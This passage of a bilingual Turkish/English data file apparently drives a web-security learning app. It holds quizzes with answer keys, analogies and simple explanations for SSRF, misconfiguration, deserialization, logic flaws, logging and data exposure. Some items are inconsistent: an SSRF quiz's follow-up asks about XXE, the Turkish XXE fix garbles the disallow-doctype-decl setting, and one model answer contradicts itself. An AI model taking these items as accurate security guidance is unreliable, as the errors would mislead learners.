          tr: "Saldırganın, hedef sunucuyu aracı olarak kullanarak iç ağdaki (internal) diğer sistemleri taramasına yol açan zafiyet hangisidir?",
          en: "Which vulnerability allows an attacker to scan internal network devices by utilizing the target server as a proxy?"
        },
        options: [
          { id: 'a', text: "Cross-Site Scripting (XSS)" },
          { id: 'b', text: "Server-Side Request Forgery (SSRF)" },
          { id: 'c', text: "Broken Authentication" },
          { id: 'd', text: "SQL Injection" }
        ],
        correct: 'b',
        explanation: {
          tr: "SSRF (Server-Side Request Forgery) sunucunun kendi üzerinden iç ağdaki servislere (localhost veya bulut metadata sunucuları) istek yapmasını sağlar.",
          en: "SSRF (Server-Side Request Forgery) tricks the server into issuing HTTP requests to its own internal devices and assets."
        },
        retryQuestion: {
          question: {
            tr: "Java'da XML okurken XXE (XML External Entity) zafiyetini engellemenin en doğru yolu nedir?",
            en: "What is the best way to prevent XML External Entity (XXE) vulnerabilities in Java XML parsers?"
          },
          options: [
            { id: 'a', text: { tr: "XML okumayı tamamen bırakmak", en: "Stop using XML files entirely" } },
            { id: 'b', text: { tr: "External Entities (harici varlıklar) özelliğini kodda pasif hale getirmek (disallow-doctype-decl)", en: "Explicitly disabling DTD / External Entities features in the parser configuration" } },
            { id: 'c', text: { tr: "XML'i düz metne dönüştürmek", en: "Converting XML to raw string" } },
            { id: 'd', text: { tr: "WAF kurmak", en: "Only using a basic firewall" } }
          ],
          correct: 'b',
          explanation: {
            tr: "XML parser kütüphanelerinde (DocumentBuilderFactory vb.) DOCTYPE ve harici entity çözümleme parametreleri (disallow-doctype-decl) false yapılarak XXE engellenir.",
            en: "Disabling DTD (Document Type Definition) resolution in the parser engine completely blocks XML External Entity injections."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "SSRF (Server-Side Request Forgery) açığını, sunucu robotunu kandıran bir çocuk benzetmesiyle 5 yaşındaki birine anlatır gibi özetle.",
          en: "Explain SSRF to a 5-year-old child using a guard robot, private castle rooms, and a tricky map."
        },
        keywords: [
          ["robot", "muhafız", "guard"],
          ["kale", "castle", "oda", "room"],
          ["kandır", "trick", "fool"],
          ["adres", "url", "harita", "map"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Kalede dışarıdan gelen siparişleri getiren sevimli bir robot muhafız var. Kötü çocuk robota 'Git kalenin içindeki gizli kasayı aç' diye bir adres yazıp veriyor. Robot da adresi sorgulamadan kalenin gizli odasındaki hazineyi alıp çocuğa getiriyor. Buna SSRF denir.",
          en: "There's a castle robot that fetches packages. A tricky kid writes down a map to the castle's private basement room. The robot blindly follows the map, goes to the private room, and leaks the golden secrets. This is SSRF."
        }
      }
    ]
  },

  // ── Tab 6: Security Misconfigurations ────────────────────────────────────
  {
    title: { tr: "6. Security Misconfigurations", en: "6. Security Misconfigurations" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '⚙️',
        content: {
          tr: "Security Misconfiguration (Hatalı Yapılandırma), yeni aldığın kalenin kapısına varsayılan şifre kartını (admin / admin) asılı bırakmak veya arka bahçe kapısını tamamen açık unutmaktır.",
          en: "Security Misconfiguration is like buying a new safe and leaving its factory default passcode (admin/admin) active, or leaving structural blueprint pages taped to the front door."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Yapılandırma Hataları", en: "2 Analogies: Security Misconfigurations" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Varsayılan Fabrika Şifresi", en: "Factory Default Passcode" },
            desc: {
              tr: "Cihazı veya yazılımı (örn. Jenkins, Tomcat) kurduktan sonra admin/admin, admin/password gibi varsayılan hesapları kapatmamaktır.",
              en: "Leaving administrative tools configured with default factory log-ins like admin/admin or admin/password after initial deployment."
            }
          },
          {
            label: { tr: "Detaylı Hata Çıktısı (Stack Trace)", en: "Verbose Stack Trace Leaks" },
            desc: {
              tr: "Uygulama hata verdiğinde ekranda tüm veritabanı satırlarını, java sınıflarını ve dosya yollarını gösteren kırmızı hata yazılarının (Stack Trace) sızmasıdır.",
              en: "Exposing stack traces, SQL errors, and system class variables in UI popups when a user types something unexpected."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Sık Yaşanır?", en: "2 Reasonings: Why It Is Common" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '📦',
            label: { tr: "Hazır Kurulum Rahatlığı", en: "Out-of-the-Box Convenience" },
            desc: {
              tr: "Geliştiriciler ve sistem yöneticileri test ortamında hızlıca çalışmak için güvenlik ayarlarını (ör. debug modu, açık portlar) kapatır ama canlıya alırken açmayı unuturlar.",
              en: "Teams turn off firewalls, enable verbose logs, and use debug flags during local testing, but forget to replace them with production rules."
            }
          },
          {
            icon: '🛑',
            label: { tr: "Kullanılmayan Servislerin Açık Kalması", en: "Unused Active Ports" },
            desc: {
              tr: "Kullanılmayan default servlet'ler, swagger-ui dokümanları, veritabanı yönetim sayfaları internete açık kaldığı için hacker'lara kapı aralar.",
              en: "Leaving development utilities, sandbox profiles, and documentation portals accessible on public production servers."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Güvenli Yapılandırma", en: "2 LEGO Analogies: Configuring LEGO Pieces" }
      },
      {
        type: 'security-lego-visual',
        variant: 'config'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Aşağıdakilerden hangisi bir 'Security Misconfiguration' (Hatalı Yapılandırma) örneğidir?",
          en: "Which of the following is a classic example of a Security Misconfiguration?"
        },
        options: [
          { id: 'a', text: { tr: "Varsayılan admin/admin şifresinin aktif bırakılması", en: "Leaving default admin/admin credentials active" } },
          { id: 'b', text: { tr: "Sunucuda debug loglarının ve stack trace çıktılarının kullanıcılara gösterilmesi", en: "Displaying detailed stack traces and debugging logs to public web clients" } },
          { id: 'c', text: { tr: "Gereksiz portların ve servislerin açık bırakılması", en: "Leaving unused ports and sample developer tools exposed" } },
          { id: 'd', text: { tr: "Hepsi", en: "All of the above" } }
        ],
        correct: 'd',
        explanation: {
          tr: "Varsayılan şifreler, debug ekranları ve kullanılmayan açık portlar hatalı yapılandırma (misconfiguration) kapsamına giren zayıflıklardır.",
          en: "Default passwords, open debug endpoints, and verbose error pages all represent failure to secure configure systems."
        },
        retryQuestion: {
          question: {
            tr: "Canlı ortamda (Production) java web uygulamasının hata sayfalarında ne gösterilmelidir?",
            en: "What should be displayed on error pages in a production environment?"
          },
          options: [
            { id: 'a', text: { tr: "Detaylı SQL sorgusu ve Java Stack Trace", en: "The raw SQL query and Java exception stack trace" } },
            { id: 'b', text: { tr: "Sunucu IP adresi ve klasör dizin yapısı", en: "Internal server IP and root directory structures" } },
            { id: 'c', text: { tr: "Zararsız, genel bir hata mesajı ve referans kodu", en: "A user-friendly generic message with a unique transaction reference ID" } },
            { id: 'd', text: { tr: "Hiçbir şey gösterilmemelidir", en: "A blank white screen" } }
          ],
          correct: 'c',
          explanation: {
            tr: "Kullanıcıya detaylı hata bilgisi verilmemeli, hata arka planda loglanmalı ve sadece genel bir hata mesajı ('Bir sorun oluştu') gösterilmelidir.",
            en: "Exposing stack traces leaks framework versions and architecture. Use generic friendly messages and log exceptions privately."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Security Misconfiguration (Hatalı Yapılandırma) açığını, yeni alınan bir oyuncak ev ve onun fabrika şifreleri üzerinden çocuksu kelimelerle açıkla.",
          en: "Explain Security Misconfiguration to a 5-year-old using a new playhouse and its factory default codes."
        },
        keywords: [
          ["oyuncak", "house", "safe", "kasa"],
          ["şifre", "code", "password", "0000", "default"],
          ["değiştir", "change", "set"],
          ["açık", "open", "forget", "unut"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Yeni bir oyuncak şifreli kasa alıyorsun. Kasanın ilk şifresi 0000. Eğer bu şifreyi değiştirmeyi unutup kasayı sokağa bırakırsan, yoldan geçen her çocuk kasayı tık diye açar ve içindeki boya kalemlerini çalar. İşte bu hatalı yapılandırmadır.",
          en: "You buy a toy safe. The safe passcode is set to 0000 at the factory. If you forget to change it, any kid walking by can press 0000, open the safe, and steal your drawings."
        }
      }
    ]
  },

  // ── Tab 7: Insecure Deserialization ──────────────────────────────────────
  {
    title: { tr: "7. Insecure Deserialization", en: "7. Insecure Deserialization" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🧬',
        content: {
          tr: "Insecure Deserialization, bir LEGO robotunu paketleyip (Serialization) kutuyla kargolarken, yolda birinin paketi açıp robotun yapım kılavuzunu 'kendi kendini yok eden bombaya' dönüştürecek şekilde değiştirmesidir (Deserialization).",
          en: "Insecure Deserialization is like disassembling a Lego robot into a shipping box (Serialization) and someone opening the box in transit to swap the guide steps, forcing the builder to construct a self-destruct device (Deserialization)."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Veri Paketleme Açıkları", en: "2 Analogies: Insecure Deserialization" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Büyülü IKEA Mobilyası", en: "The Enchanted IKEA Furniture" },
            desc: {
              tr: "Demonte gelen sehpa paketinin içine, sehpa yerine gizlice tahta bir canavar yapım adımları yerleştirilmesidir. Paket açılıp birleştirildiğinde (deserialization) canavar canlanır.",
              en: "Receiving flatpack furniture where someone swapped the instruction manual. When you rebuild it, you create a wooden troll that attacks your house."
            }
          },
          {
            label: { tr: "Sihirli İksir Malzemeleri", en: "Potion Recipe Swap" },
            desc: {
              tr: "İksir malzemelerini ayrı kavanozlarda gönderirsin. Alıcı bunları karıştırıp kaynatırken (veri işleme), kavanozun birine zehirli bir mantar eklenmiş olduğunu fark etmez.",
              en: "Sending potion ingredients in separate boxes. While cooking them together, you realize someone slipped a firecracker root into box number 3."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Gerçekleşir?", en: "2 Reasonings: Why Deserialization Fails" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🧩',
            label: { tr: "Verinin Nesneye Dönüşme Anı", en: "Rebuilding Objects Blindly" },
            desc: {
              tr: "Programlar ağ üzerinden gelen bayt dizilerini (byte stream) tekrar Java nesnesine (Object) dönüştürürken, nesnenin constructor'ı veya readObject() metodu otomatik çalışır.",
              en: "Web servers reconstruct byte streams back into Java classes. During this phase, internal methods like readObject() execute before validation checks occur."
            }
          },
          {
            icon: '🛑',
            label: { tr: "Güvenilmeyen Girdilere Güvenmek", en: "Trusting Untrusted Byte Streams" },
            desc: {
              tr: "Eğer gelen bayt verisi imzalanmamışsa (tamper check yoksa) saldırgan nesnenin içindeki değişkenleri değiştirerek sunucuda uzaktan kod çalıştırabilir (RCE).",
              en: "Without digital signature checks on byte arrays, attackers rewrite object state variables, triggering Remote Code Execution (RCE)."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Güvenli Nesne Yapımı", en: "2 LEGO Analogies: Safe Object Assembly" }
      },
      {
        type: 'security-lego-visual',
        variant: 'deserialization'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Serialization (Serileştirme) nedir?",
          en: "What is serialization?"
        },
        options: [
          { id: 'a', text: { tr: "Veritabanını yedekleme işlemi", en: "Backing up a database" } },
          { id: 'b', text: { tr: "Bir nesnenin durumunu (State) depolanabilecek veya iletilebilecek bir bayt dizisine dönüştürme işlemi", en: "Converting an active object's state into a byte stream for storage or transmission" } },
          { id: 'c', text: { tr: "HTML sayfalarını CSS ile süsleme", en: "Beautifying HTML with CSS" } },
          { id: 'd', text: { tr: "Tüm şifreleri veritabanına kaydetme", en: "Writing passwords to database tables" } }
        ],
        correct: 'b',
        explanation: {
          tr: "Serileştirme nesneyi bayt dizisine dönüştürür. Bunun tersi (Deserialization) ise bayt dizisinden canlı nesne oluşturmaktır.",
          en: "Serialization packs an object into bytes. Deserialization is the reverse — reconstructing live objects from a byte stream."
        },
        retryQuestion: {
          question: {
            tr: "Insecure Deserialization zafiyetini önlemek için en güvenli yaklaşım hangisidir?",
            en: "What is the safest defense against insecure deserialization?"
          },
          options: [
            { id: 'a', text: { tr: "Asla güvensiz kaynaklardan gelen serileştirilmiş nesneleri kabul etmemek", en: "Avoid accepting serialized object streams from untrusted sources" } },
            { id: 'b', text: { tr: "Sadece JSON veya XML gibi düz metin formatlarını kullanmak", en: "Preferring simple data formats like JSON or XML instead of raw objects" } },
            { id: 'c', text: { tr: "İletilen verileri kriptografik olarak imzalamak (HMAC)", en: "Implementing cryptographic signatures (like HMAC) to verify data integrity" } },
            { id: 'd', text: { tr: "Hepsi", en: "All of the above" } }
          ],
          correct: 'd',
          explanation: {
            tr: "Java nesne serileştirmesi yerine JSON kullanmak, gelen veriyi imzalamak ve güvensiz serileri engellemek en iyi çözümlerdir.",
            en: "All listed steps help: avoiding raw java objects, migrating to JSON, and validating stream integrity with signatures."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Insecure Deserialization zafiyetini, demonte bir oyuncağı kargolama ve yapım kılavuzunu değiştirme analojisiyle 5 yaşındaki birine açıkla.",
          en: "Explain Insecure Deserialization to a 5-year-old child using lego models, cargo shipping, and swap manual hacks."
        },
        keywords: [
          ["kutu", "box", "kargo", "package"],
          ["birleştir", "build", "assemble"],
          ["kılavuz", "manual", "guide", "talimat", "instruction"],
          ["değiştir", "change", "swap", "hırsız", "thief"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Bir oyuncağı parçalayıp kutuya koyup arkadaşına gönderiyorsun (serialization). Yolda kötü bir hırsız kutuyu açıp içine kendi bomba yapım kılavuzunu koyuyor. Arkadaşın kutuyu açıp parçaları birleştirirken (deserialization) yanlışlıkla bombayı yapıyor ve oyuncak patlıyor. Buna insecure deserialization denir.",
          en: "You break apart a lego castle, put it in a package, and ship it. A thief opens it in transit and swaps the instructions for a TNT device manual. When your friend opens and rebuilds the castle, they construct the TNT instead. This is insecure deserialization."
        }
      }
    ]
  },

  // ── Tab 8: Business Logic Flaws ──────────────────────────────────────────
  {
    title: { tr: "8. Business Logic Flaws", en: "8. Business Logic Flaws" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🧠',
        content: {
          tr: "Business Logic Flaw (İş Mantığı Hatası), bir bakkaldan 5 adet elma alıp karşılığında bakkala -5 lira ödemek (yani bakkaldan zorla para almak) gibi, uygulamanın mantıksal işleyişindeki açıkları sömürmektir.",
          en: "Business Logic Flaws are like ordering -5 apples from a grocery store so that the cashier registers negative price and ends up giving you money, exploiting logical gaps in code flow."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: İş Mantığı Hataları", en: "2 Analogies: Business Logic Flaws" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Eksi Fiyatlı Alışveriş", en: "Negative Quantity Shopping" },
            desc: {
              tr: "Sepetine 1 adet 100 TL'lik kulaklık, yanına da -2 adet 50 TL'lik kablo eklediğinde toplam sepet tutarının 0 TL olması ve sistemin siparişi onaylamasıdır.",
              en: "Adding 1 headphone ($100) and -2 cables (-$100) to your cart. The total equals $0, and the website ships the headphone for free."
            }
          },
          {
            label: { tr: "Kupon Kodu Kısır Döngüsü", en: "Coupon Code Loop" },
            desc: {
              tr: "Aynı indirim kuponunu (örn. WELCOME10) tek sepette arka arkaya 5 kere uygulayarak sepeti bedavaya getirmektir.",
              en: "Applying the same 10% coupon code multiple times in a single checkout loop, eventually reducing the price to $0."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Kod Tarafında Yakalanamaz?", en: "2 Reasonings: Why Automated Scanners Miss Logic Flaws" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🛑',
            label: { tr: "Sentaks Hatasının Olmaması", en: "Valid Syntax, Wrong Rules" },
            desc: {
              tr: "Bu zafiyette SQLi veya XSS gibi zararlı bir kod girdisi yoktur. Kod tamamen kurallara uygun çalışır, ancak iş kuralları (fiyat kontrolü) eksik tasarlanmıştır.",
              en: "There are no malicious syntax inputs (no quotes, no script tags). The server sees valid numbers, but fails to check if values make physical sense."
            }
          },
          {
            icon: '🧠',
            label: { tr: "Otomatik Araçların Körlüğü", en: "Automated Tool Blindness" },
            desc: {
              tr: "Güvenlik tarayıcıları iş mantığını bilmezler. Bu yüzden eksi sayı göndermenin mantıksal sonucunu sadece insan zekası ve QA mühendisleri test edip bulabilir.",
              en: "Security scanners do not understand business flows. Only human testers and QA scripts can verify if negative values violate domain logic rules."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Mantıksal Sınırları Çizmek", en: "2 LEGO Analogies: Business Rule Limits" }
      },
      {
        type: 'security-lego-visual',
        variant: 'logic'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Aşağıdakilerden hangisi bir 'Business Logic Flaw' (İş Mantığı Hatası) zafiyetidir?",
          en: "Which of the following represents a classic Business Logic Flaw?"
        },
        options: [
          { id: 'a', text: { tr: "Bir kullanıcının başka bir kullanıcının sepetindeki ürün fiyatını istek parametrelerini değiştirerek 1 TL yapması", en: "Altering request price parameters to purchase a $1000 laptop for $1" } },
          { id: 'b', text: { tr: "Aynı kupon kodunu aynı sepette defalarca kullanarak fiyatı sıfırlamak", en: "Applying a single-use coupon repeatedly in parallel threads to stack discounts" } },
          { id: 'c', text: { tr: "Para transferi alanına negatif değer yazarak kendi hesabına para çekmek", en: "Entering a negative money transfer value to pull cash instead of sending it" } },
          { id: 'd', text: { tr: "Hepsi", en: "All of the above" } }
        ],
        correct: 'd',
        explanation: {
          tr: "Sepet manipülasyonu, kupon istismarı ve negatif transferler sistemin iş kurallarındaki mantık açıklarını (Logic Flaws) hedefler.",
          en: "Manipulating prices, abusing coupons, and negative inputs exploit gaps in application logic rather than code vulnerabilities."
        },
        retryQuestion: {
          question: {
            tr: "QA mühendisleri iş mantığı hatalarını yakalamak için otomasyon testlerinde ne yapmalıdır?",
            en: "What should QA engineers focus on to detect business logic flaws in automated tests?"
          },
          options: [
            { id: 'a', text: { tr: "Sınır değer testleri (Boundary Value Testing) ve negatif senaryoları (negatif adet, boş değer) simüle etmek", en: "Simulating boundary value tests and negative inputs (negative quantities, empty parameters)" } },
            { id: 'b', text: { tr: "Sadece pozitif yolları test etmek", en: "Running only happy path flows" } },
            { id: 'c', text: { tr: "CSS dosyalarını kontrol etmek", en: "Asserting CSS property elements" } },
            { id: 'd', text: { tr: "Uygulamayı yeniden başlatmak", en: "Restarting the backend container" } }
          ],
          correct: 'a',
          explanation: {
            tr: "Sınır değer testleri (Boundary Analysis) ve negatif senaryolar (negatif adet, aşırı miktar) iş mantığı açıklarını yakalamanın en etkili otomasyon yoludur.",
            en: "Asserting boundary limits and negative quantities forces validation rules to trigger, exposing logic gaps."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Business Logic Flaw (İş Mantığı Hatası) kavramını, bakkal elma alışverişi ve negatif sayı örneğiyle 5 yaşındaki bir çocuğa anlat.",
          en: "Explain Business Logic Flaws to a 5-year-old child using a grocery store, apples, and negative money numbers."
        },
        keywords: [
          ["bakkal", "store", "shop"],
          ["elma", "apple", "fruit"],
          ["eksi", "negative", "minus"],
          ["para", "money", "pay"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Bakkala gidip 'Bana eksi 2 elma ver' diyorsun. Bakkal amcanın kafası karışıyor ve sana elma vermek yerine kendi cebinden çıkartıp sana para veriyor. İşte bu sistemin mantık hatasıdır.",
          en: "You go to a shop and order minus 2 apples. The confused shopkeeper, instead of taking your money, hands you 2 apples and pays you cash from his pocket. This is a logic flaw."
        }
      }
    ]
  },

  // ── Tab 9: Logging & Monitoring ──────────────────────────────────────────
  {
    title: { tr: "9. Logging & Monitoring", en: "9. Logging & Monitoring" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🕵️',
        content: {
          tr: "Logging & Monitoring Zafiyetleri, bir kaleye hırsız girdiğinde alarmın çalmaması, güvenlik kameralarının çalışmaması veya gardiyanın uyuduğu için hırsızın kaleyi terk edene kadar fark edilmemesidir.",
          en: "Logging & Monitoring weakness is like a thief breaking into a castle, but the alarm bells are silenced, the security cameras have no recording tape, and the guard is asleep."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: İzleme ve Kayıt Eksikliği", en: "2 Analogies: Logging and Monitoring" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Boş Güvenlik Kamerası", en: "Empty Camera Reel" },
            desc: {
              tr: "Kameranın açık olması ama içinde kaset olmamasıdır. Olay anında ne olduğunu, kimin girdiğini asla bulamazsınız (Kayıt Eksikliği).",
              en: "The security cameras are pointed at the vault, but they are not recording. After a robbery, you have no evidence of what happened."
            }
          },
          {
            label: { tr: "Sessiz Yangın Alarmı", en: "Silent Fire Alarm" },
            desc: {
              tr: "Binada yangın çıktığında dedektörün dumanı algılaması ama dışarıya ses vermemesidir. İtfaiye (Güvenlik Ekibi) durumdan haberdar olamaz.",
              en: "A smoke detector senses fire but is not connected to a siren. The fire brigade (security response team) is never alerted."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Önemlidir?", en: "2 Reasonings: Why Logs Are Critical" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🔍',
            label: { tr: "Saldırı Altında Olduğunu Bilmemek", en: "Unaware of Ongoing Attacks" },
            desc: {
              tr: "Saldırganlar sisteme sızmak için binlerce şifre dener. Eğer loglama yoksa, bu başarısız denemeleri fark edip saldırganı engelleyemeyiz.",
              en: "Hackers perform credential stuffing over days. Without active logs, administrators never notice the millions of failed password requests."
            }
          },
          {
            icon: '📝',
            label: { tr: "Adli Analiz (Forensics) İmkansızlığı", en: "Impossible Forensics Analysis" },
            desc: {
              tr: "Bir hack olayı yaşandıktan sonra hangi verilerin çalındığını, açığın nereden kaynaklandığını anlamak için geçmiş log kayıtlarına muhtaç kalırız.",
              en: "After a breach, teams must determine which tables were leaked. Without historic application logs, forensic analysis is impossible."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Günlük Tutma", en: "2 LEGO Analogies: Ledger Logs" }
      },
      {
        type: 'security-lego-visual',
        variant: 'logging'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Yetersiz Loglama ve İzleme zafiyeti (Insufficient Logging & Monitoring) en çok hangi duruma sebep olur?",
          en: "What is the primary impact of Insufficient Logging & Monitoring?"
        },
        options: [
          { id: 'a', text: { tr: "Veritabanının çökmesine", en: "Instant database corruption" } },
          { id: 'b', text: { tr: "Saldırganların sistemde fark edilmeden uzun süre kalabilmesine ve veri sızdırmasına", en: "Attackers remaining undetected inside network nodes for months to exfiltrate data" } },
          { id: 'c', text: { tr: "HTML elementlerinin kaybolmasına", en: "HTML render bugs in UI layout" } },
          { id: 'd', text: { tr: "Oturumların otomatik sonlanmasına", en: "Automatic session timeouts" } }
        ],
        correct: 'b',
        explanation: {
          tr: "Yetersiz izleme olduğunda, bir siber saldırı gerçekleşse bile fark edilmesi ortalama 200 günü bulabilir, bu sürede tüm veriler çalınabilir.",
          en: "Without active monitoring, detection of a breach takes over 200 days on average, allowing persistent data exfiltration."
        },
        retryQuestion: {
          question: {
            tr: "Güvenli bir loglama sisteminde hangi bilginin log dosyasına yazılması büyük bir güvenlik açığıdır?",
            en: "What type of data should NEVER be written into application log files?"
          },
          options: [
            { id: 'a', text: { tr: "Kullanıcının IP adresi", en: "User IP addresses" } },
            { id: 'b', text: { tr: "Hata oluşan kod satır numarası", en: "Code exception line numbers" } },
            { id: 'c', text: { tr: "Kullanıcı şifreleri, kredi kartı bilgileri veya JWT token'ları", en: "User passwords, credit card numbers, or raw session JWT tokens" } },
            { id: 'd', text: { tr: "İstek yapılan API adresi", en: "Target API endpoint paths" } }
          ],
          correct: 'c',
          explanation: {
            tr: "Hassas kişisel veriler (Şifreler, Kartlar, Tokenlar) asla düz metin (plain text) olarak log dosyalarına yazılmamalıdır (Sensitive Data Exposure).",
            en: "Writing cleartext credentials, sessions, or payment tokens to log directories represents a major data exposure breach."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Logging ve Monitoring (Günlük Tutma ve İzleme) eksikliğini, bir kalenin bekçi kamerası örneğiyle 5 yaşındaki birine anlat.",
          en: "Explain Logging & Monitoring to a 5-year-old child using a castle guard, camera tapes, and a sneaky thief."
        },
        keywords: [
          ["kamera", "camera"],
          ["kaset", "tape", "film", "kayıt", "record"],
          ["hırsız", "thief"],
          ["bekçi", "guard", "alarm"]
        ],
        minScore: 2,
        modelAnswer: {
          tr: "Kalenin güvenlik kamerası var ama içine kaset koymayı unutmuşlar. Gece kaleye bir hırsız giriyor, oyuncakları alıp gidiyor. Kaset olmadığı için hırsızın kim olduğunu ve neyi çaldığını asla öğrenemiyoruz. İşte bu loglama eksikliğidir.",
          en: "A castle has a camera but forgot to load tape. A thief sneaks in, steals toys, and escapes. Because there's no recording, we have no idea who did it. That is lack of logging."
        }
      }
    ]
  },

  // ── Tab 10: Sensitive Data Exposure ──────────────────────────────────────
  {
    title: { tr: "10. Sensitive Data Exposure", en: "10. Sensitive Data Exposure" },
    blocks: [
      {
        type: 'simple-box',
        emoji: '🔓',
        content: {
          tr: "Sensitive Data Exposure (Hassas Veri İfşası), evindeki kasanın şifresini bir kağıda yazıp, sokaktan geçen herkesin görebileceği şekilde pencereye yapıştırmaktır.",
          en: "Sensitive Data Exposure is like writing your house safe's master pin code on a bright sticky note and taping it on your street-facing window in plain text."
        }
      },
      {
        type: 'heading',
        text: { tr: "2 Analoji: Hassas Veri İfşası", en: "2 Analogies: Sensitive Data Exposure" }
      },
      {
        type: 'steps',
        items: [
          {
            label: { tr: "Cam Kutu İçindeki Altın", en: "Gold inside a Glass Box" },
            desc: {
              tr: "Değerli eşyalarını korumalı bir çelik kasa yerine, sokaktaki herkesin görebileceği şeffaf cam bir kutuda saklamandır (Şifreleme Eksikliği).",
              en: "Storing your gold in a transparent glass container on the curb rather than lockable heavy metal safes (Lack of Encryption)."
            }
          },
          {
            label: { tr: "Postacının Kartpostalı Okuması", en: "Postman Reading a Postcard" },
            desc: {
              tr: "Mektupları kapalı zarf (HTTPS) yerine kartpostal (HTTP) ile göndermektir. Yoldaki herkes (iss, hacker) kartpostalın üstündeki şifreyi okuyabilir.",
              en: "Sending letters via open postcards (HTTP) instead of sealed security envelopes (HTTPS). Anyone carrying the postcard can read the content."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 Akıl Yürütme: Neden Büyük Bir Tehdittir?", en: "2 Reasonings: The Risk of Plaintext Data" }
      },
      {
        type: 'grid',
        cols: 2,
        items: [
          {
            icon: '🛑',
            label: { tr: "Düz Metin Şifre Depolama", en: "Plaintext Password Storage" },
            desc: {
              tr: "Veritabanına şifreleri `123456` şeklinde düz yazıyla kaydetmek büyük bir hatadır. Şifreler her zaman tek yönlü hash algoritmalarıyla (ör. bcrypt) şifrelenmelidir.",
              en: "Storing master passwords as plaintext strings in SQL. If database tables leak, every single credential is exposed. Always apply bcrypt hashing."
            }
          },
          {
            icon: '🌐',
            label: { tr: "HTTP Protokolü Kullanımı", en: "Using Cleartext HTTP" },
            desc: {
              tr: "HTTPS yerine HTTP kullanan sitelerde, login istekleri ağdaki (Wi-Fi vb.) herkes tarafından koklanabilir (Sniffing). Veriler şifrelenmeden akar.",
              en: "Transmitting login forms over HTTP. Malicious nodes on public WiFi easily sniff network packets to copy plain passwords."
            }
          }
        ]
      },
      {
        type: 'heading',
        text: { tr: "2 LEGO ile Anlatım: Şifreleme", en: "2 LEGO Analogies: Data Scrambling" }
      },
      {
        type: 'security-lego-visual',
        variant: 'sensitive-data'
      },
      {
        type: 'quiz',
        isSecurityQuiz: true,
        question: {
          tr: "Bir kullanıcının şifresini veritabanında saklamanın en güvenli yolu nedir?",
          en: "What is the most secure method to store user passwords in a database?"
        },
        options: [
          { id: 'a', text: { tr: "Base64 ile encode etmek", en: "Encoding with Base64" } },
          { id: 'b', text: { tr: "Düz metin (Plaintext) olarak kaydetmek", en: "Saving as plaintext strings" } },
          { id: 'c', text: { tr: "Güçlü bir tek yönlü hash algoritması (Salted Bcrypt/PBKDF2) ile şifreleyerek kaydetmek", en: "Hashing using a strong cryptographic hash algorithm with salt (Bcrypt or Argon2)" } },
          { id: 'd', text: { tr: "AES-128 ile çift yönlü şifrelemek", en: "Reversible AES-128 encryption" } }
        ],
        correct: 'c',
        explanation: {
          tr: "Base64 şifreleme değildir, Base64 kolayca çözülebilir. Şifreler tek yönlü hash (Bcrypt) ile geri döndürülemez şekilde şifrelenmelidir.",
          en: "Base64 is simple encoding, not encryption. Passwords must be saved using one-way cryptographic hash functions like Bcrypt."
        },
        retryQuestion: {
          question: {
            tr: "Tarayıcı ile sunucu arasındaki veri trafiğini ağ koklayıcılara (sniffers) karşı koruyan şifreli iletim protokolü hangisidir?",
            en: "Which protocol encrypts web traffic in transit to defend against network packet sniffers?"
          },
          options: [
            { id: 'a', text: "HTTP" },
            { id: 'b', text: "FTP" },
            { id: 'c', text: "HTTPS" },
            { id: 'd', text: "SMTP" }
          ],
          correct: 'c',
          explanation: {
            tr: "HTTPS, SSL/TLS kullanarak istemci ile sunucu arasındaki tüm verileri şifreler, böylece aradaki hırsızlar veriyi okuyamaz.",
            en: "HTTPS encrypts communications between client browsers and servers using SSL/TLS encryption layers."
          }
        }
      },
      {
        type: 'feynman-checkpoint',
        prompt: {
          tr: "Hassas Veri İfşası (Sensitive Data Exposure) zafiyetini, şifreyi açıkta bırakma ve şifreleme örneğiyle 5 yaşındaki birine açıkla.",
